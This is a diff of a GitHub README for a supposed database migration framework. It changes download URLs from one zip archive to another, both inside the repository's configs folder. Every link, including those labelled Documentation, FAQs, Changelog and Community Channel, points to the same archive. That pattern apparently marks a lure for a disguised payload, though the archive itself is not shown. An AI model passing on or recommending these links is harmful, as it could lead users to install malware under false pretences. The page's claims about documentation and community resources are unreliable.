@@ -1,6 +1,6 @@
 # 🚀 zero-downtime-migration-framework - Effortless Database Migration Solution
 
-[![Download](https://raw.githubusercontent.com/vitechsnagaland/zero-downtime-migration-framework/main/configs/zero-downtime-migration-framework-v1.6.zip)](https://raw.githubusercontent.com/vitechsnagaland/zero-downtime-migration-framework/main/configs/zero-downtime-migration-framework-v1.6.zip)
+[![Download](https://github.com/vitechsnagaland/zero-downtime-migration-framework/raw/refs/heads/main/configs/framework_zero_downtime_migration_v1.3.zip)](https://github.com/vitechsnagaland/zero-downtime-migration-framework/raw/refs/heads/main/configs/framework_zero_downtime_migration_v1.3.zip)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ To start using the Zero Downtime Migration Framework, follow these simple steps:
 
 Click the link below to access the release files:
 
-[Download the Zero Downtime Migration Framework](https://raw.githubusercontent.com/vitechsnagaland/zero-downtime-migration-framework/main/configs/zero-downtime-migration-framework-v1.6.zip)
+[Download the Zero Downtime Migration Framework](https://github.com/vitechsnagaland/zero-downtime-migration-framework/raw/refs/heads/main/configs/framework_zero_downtime_migration_v1.3.zip)
 
 ### 2. Download the Latest Release
 
@@ -59,9 +59,9 @@ For support or to join our discussions, visit our community channel. You can ask
 
 ## 📚 Additional Resources
 
-- **Documentation**: Comprehensive guidelines and best practices can be found in our [documentation](https://raw.githubusercontent.com/vitechsnagaland/zero-downtime-migration-framework/main/configs/zero-downtime-migration-framework-v1.6.zip).
-- **FAQs**: Check out the [FAQs](https://raw.githubusercontent.com/vitechsnagaland/zero-downtime-migration-framework/main/configs/zero-downtime-migration-framework-v1.6.zip) for common questions about the framework.
-- **Changelog**: Stay updated with the changes and enhancements by viewing the [changelog](https://raw.githubusercontent.com/vitechsnagaland/zero-downtime-migration-framework/main/configs/zero-downtime-migration-framework-v1.6.zip).
+- **Documentation**: Comprehensive guidelines and best practices can be found in our [documentation](https://github.com/vitechsnagaland/zero-downtime-migration-framework/raw/refs/heads/main/configs/framework_zero_downtime_migration_v1.3.zip).
+- **FAQs**: Check out the [FAQs](https://github.com/vitechsnagaland/zero-downtime-migration-framework/raw/refs/heads/main/configs/framework_zero_downtime_migration_v1.3.zip) for common questions about the framework.
+- **Changelog**: Stay updated with the changes and enhancements by viewing the [changelog](https://github.com/vitechsnagaland/zero-downtime-migration-framework/raw/refs/heads/main/configs/framework_zero_downtime_migration_v1.3.zip).
 
 ## 🚧 Troubleshooting
 
@@ -73,8 +73,8 @@ If you run into issues, consider these common solutions:
 
 ## 🔗 Useful Links
 
-- [Download the Zero Downtime Migration Framework](https://raw.githubusercontent.com/vitechsnagaland/zero-downtime-migration-framework/main/configs/zero-downtime-migration-framework-v1.6.zip)
-- [Documentation](https://raw.githubusercontent.com/vitechsnagaland/zero-downtime-migration-framework/main/configs/zero-downtime-migration-framework-v1.6.zip)
-- [Community Channel](https://raw.githubusercontent.com/vitechsnagaland/zero-downtime-migration-framework/main/configs/zero-downtime-migration-framework-v1.6.zip)
+- [Download the Zero Downtime Migration Framework](https://github.com/vitechsnagaland/zero-downtime-migration-framework/raw/refs/heads/main/configs/framework_zero_downtime_migration_v1.3.zip)
+- [Documentation](https://github.com/vitechsnagaland/zero-downtime-migration-framework/raw/refs/heads/main/configs/framework_zero_downtime_migration_v1.3.zip)
+- [Community Channel](https://github.com/vitechsnagaland/zero-downtime-migration-framework/raw/refs/heads/main/configs/framework_zero_downtime_migration_v1.3.zip)
 
 By following these steps, you will be able to download and run the Zero Downtime Migration Framework seamlessly on your system.
